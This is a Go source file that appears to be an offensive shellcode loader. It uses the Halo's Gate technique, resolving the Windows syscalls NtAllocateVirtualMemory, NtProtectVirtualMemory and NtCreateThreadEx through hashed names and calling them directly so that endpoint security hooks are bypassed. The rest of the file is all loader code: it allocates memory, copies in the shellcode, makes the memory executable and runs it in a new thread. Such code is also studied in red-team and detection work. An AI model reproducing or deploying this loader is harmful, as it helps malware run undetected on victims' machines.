package halosgate2

import (
	"crypto/sha1"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"
)

func Gates(shellcode []byte) {

	var thisThread = uintptr(0xffffffffffffffff)

	myNtAllocateVirtualMemory, err := MemHgate(str2sha1("NtAllocateVirtualMemory"), str2sha1)
	if err != nil {
		panic(err)
	}

	myNtProtectVirtualMemory, err := DiskHgate(Sha256Hex("NtProtectVirtualMemory"), Sha256Hex)
	if err != nil {
		panic(err)
	}

	myNtCreateThreadEx, err := MemHgate(Sha256Hex("NtCreateThreadEx"), Sha256Hex)
	if err != nil {
		panic(err)
	}

	// mypWaitForSingleObject, _, e := syscall.NewLazyDLL("kernel32.dll").NewProc("WaitForSingleObject").Addr()
	mypWaitForSingleObject, _, err := DiskFuncPtr("kernel32.dll", str2sha1("WaitForSingleObject"), str2sha1)
	if err != nil {
		panic(err)
	}

	myCreateThread(shellcode, thisThread, myNtAllocateVirtualMemory, myNtProtectVirtualMemory, myNtCreateThreadEx, mypWaitForSingleObject)
}

func myCreateThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16, pWaitForSingleObject uint64) {

	const (
		MemCommit  = 0x1000
		MemReserve = 0x2000
	)

	var baseA uintptr
	regionSize := uintptr(len(shellcode))

	r1, r := HgSyscall(
		NtAllocateVirtualMemorySysid,
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		uintptr(MemCommit|MemReserve),
		syscall.PAGE_READWRITE)

	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	// copy shellcode
	memcpy(baseA, shellcode)

	var oldprotect uintptr
	r1, r = HgSyscall(
		NtProtectVirtualMemorySysid,
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionSize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)))

	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	var hthread uintptr
	r1, r = HgSyscall(
		NtCreateThreadExSysid,
		uintptr(unsafe.Pointer(&hthread)), // hthread
		0x1FFFFF,                          // desiredaccess
		0,                                 // objattributes
		handle,                            // processhandle
		baseA,                             // lpstartaddress
		0,                                 // lpparam
		uintptr(0),                        // createsuspended
		0,                                 // zerobits
		0,                                 // sizeofstackcommit
		0,                                 // sizeofstackreserve
		0,                                 // lpbytesbuffer
	)
	syscall.Syscall(uintptr(pWaitForSingleObject), 2, handle, 0xffffffff, 0)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
}

func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}

func Sha256Hex(s string) string {
	return hex.EncodeToString(Sha256([]byte(s)))
}

func Sha256(data []byte) []byte {
	digest := sha256.New()
	digest.Write(data)
	return digest.Sum(nil)
}

func memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}
